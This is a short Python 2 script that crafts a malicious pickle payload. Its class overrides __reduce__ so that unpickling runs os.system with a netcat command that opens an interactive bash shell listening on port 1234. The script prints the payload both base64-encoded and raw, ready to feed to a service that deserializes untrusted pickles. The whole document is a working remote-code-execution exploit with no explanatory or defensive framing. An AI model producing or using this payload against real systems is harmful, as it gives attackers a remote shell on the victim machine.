import os;
import base64;
import cPickle;

class Blah(object):
  def __reduce__(self):
      return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ", ))

h = Blah()
encoded = base64.b64encode(cPickle.dumps(h))
data = cPickle.dumps(h)
print(encoded)
print(data)
